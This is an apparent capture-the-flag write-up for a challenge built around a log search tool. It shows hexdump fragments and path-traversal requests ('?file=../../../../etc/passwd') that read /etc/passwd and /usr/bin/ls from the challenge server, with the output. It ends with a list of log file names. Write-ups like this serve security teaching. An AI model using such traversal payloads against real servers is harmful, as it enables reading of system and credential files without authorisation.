# CHALLENGE 02

After recent attacks, we’ve developed a search tool. Search the logs and discover what the attackers were after.

Hint: Always search deeper.

https://aurora-web.h4ck.ctfcompetition.com/


## Step 1

aurora

0001bd30  61 5f 53 72 63 5c 41 75  72 6f 72 61 56 4e 43 5c  |a_Src\AuroraVNC\|



  |_

00002e70  5f 55 42 82 d5 53 50 93  ec b2 e0 6b 08 a2 94 dd  |_UB..SP....k....|
00003570  5f 09 ac 68 46 a5 e3 1c  95 61 27 29 8d a9 05 e5  |_..hF....a')....|

We realised we can use requests
https://aurora-web.h4ck.ctfcompetition.com/?file=hexdump.txt&term=00


The 4 letter check seems to be done both in backend and frontend.

```
<!-- /src.txt -->
```


https://aurora-web.h4ck.ctfcompetition.com/?file=../../../../etc/passwd&term=root
root:x:0:0:root:/root:/bin/bash

https://aurora-web.h4ck.ctfcompetition.com/?file=../../../../../usr/bin/ls&term=libu

File names in logs/
```
hexdump.txt
registry.txt
exploit_unobfuscated.js
filenames.txt
hostnames.txt
strings.txt
exploit.js
```
